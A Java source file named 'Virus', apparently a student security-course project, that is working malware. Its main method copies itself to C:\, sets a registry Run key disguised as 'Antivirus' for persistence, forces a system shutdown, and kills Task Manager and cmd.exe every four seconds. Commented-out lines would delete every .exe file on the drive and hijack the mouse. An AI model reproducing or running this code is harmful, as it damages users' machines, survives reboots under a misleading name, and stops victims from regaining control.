/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package virus;

/**
 *
 * @author Oscar Rada And Yeisonn Chipatecua
 */

import java.awt.Event;
import java.awt.Frame;
import java.awt.Panel;
import java.awt.Robot;
import java.awt.TextField;
import java.awt.event.InputEvent;
import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Virus extends Frame {

    private TextField Evento;

    public Virus() {
        super("||VIRUS :: Seguridad Informatica||");

        Panel p;
        p = new Panel();

        Evento = new TextField();
        Evento.setEditable(false);
        
        p.add(Evento);
    }

    public void autoCopia() {
        try {
            String file = "VirusSeguridad.jar";
            File inFile = new File(file);
            File outFile = new File("C:\\VirusSeguridad.jar");
            FileOutputStream out;
            try (FileInputStream in = new FileInputStream(inFile)) {
                out = new FileOutputStream(outFile);
                int Lilith;
                while ((Lilith = in.read()) != -1) {
                    out.write(Lilith);
                }
            }
            out.close();
        } catch (IOException ex) {
            Logger.getLogger(Virus.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void enSistema() {
        try {
            //Runtime.getRuntime().exec("msg *ESTAS INFECTADO POR EL VIRUS");
            Runtime.getRuntime().exec("shutdown -s -t 6 -c Virus::Borrando--Todos--Los--Exe...");
            Runtime.getRuntime().exec("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Antivirus /d C:\\VirusSeguridad.jar");
        } catch (IOException ex) {
            Logger.getLogger(Virus.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void mouseCold() {
        try {
            boolean n = true;
            Robot robot = new Robot();
            while (n != false) {
                int x = 386, y = 388;
                //Movemos el mouse a la posición de la pantalla que queramos
                robot.mouseMove(x, y);
                //presionamos el click derecho
                robot.mousePress(InputEvent.BUTTON2_MASK);
                robot.mouseRelease(InputEvent.BUTTON2_MASK);
            }
        } catch (Exception e) {
        }
    }

    public boolean handleEvent(Event evt) {

        Evento.setText(String.valueOf(evt.id)); //Captura el id del evento

        if (evt.id == Event.WINDOW_DESTROY) { //si el id es igual a cerrar ventana...
            try {
                System.exit (0); //Esta linea cierra el Virus
                //comentariado para que no haga daño
                //Runtime.getRuntime().exec("cmd.exe /c del /s /f /q c:\\*.exe");
            } catch (Exception e) {
            }
        }

        return (super.handleEvent(evt));
    }

    public static void main(String[] args) {
        boolean SinTask = false;
        Virus virus = new Virus();
        virus.autoCopia();
        virus.enSistema();
        //virus.mouseCold();
        virus.show();
        //Cierra el taskmgr.exe y el cmd.exe cada 4 segundos
        while (SinTask == false) {
            try {
                Runtime.getRuntime().exec("cmd.exe /c taskkill /f /im taskmgr.exe");
                Runtime.getRuntime().exec("cmd.exe /c taskkill /f /im cmd.exe");
                Thread.sleep(4000);
            } catch (Exception e) {
            }
        }
    }
}
